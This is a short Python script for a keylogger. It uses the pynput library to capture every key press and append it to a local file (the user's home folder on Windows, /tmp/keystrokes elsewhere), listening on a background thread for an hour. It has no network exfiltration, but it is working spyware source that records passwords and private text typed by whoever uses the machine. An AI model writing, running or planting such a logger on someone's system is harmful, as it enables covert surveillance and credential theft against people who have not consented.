#!/usr/bin/python
import os
import threading
import time
from pynput import keyboard

special_keys = {'Key.enter': '\n', 'Key.space': ' '}

import getpass
import platform
from pathlib import Path

class Keylogger:
    def __init__(self):
        # Use a cross-platform path for the keystroke log file
        if platform.system() == 'Windows':
            self.keylogs = str(Path.home() / 'keystrokes.txt')
        else:
            self.keylogs = '/tmp/keystrokes'
        self.keylogsfile = open(self.keylogs, 'a+')

    def __write_character(self, character):
        with open(self.keylogs, 'a+') as f:
            f.write(character)

    def callback(self, key):
        try:
            self.__write_character(key.char)
        except AttributeError:
            special_key = str(key)
            if special_key in special_keys.keys():
                special_key = special_keys[special_key]
            self.__write_character(special_key)

    def run(self):
        # keylogger is running on daemon thread
        print(f"Keystrokes are saved in ${self.keylogs}")
        listener = keyboard.Listener(on_press=self.callback)
        listener.daemon = True
        listener.start()

    def stop(self):
        self.keylogsfile.close()

if __name__=='__main__':
    keylogger = Keylogger()
    keylogger.run()

    # Sleep main thread and leave keylogger running in the background
    time.sleep(3600)
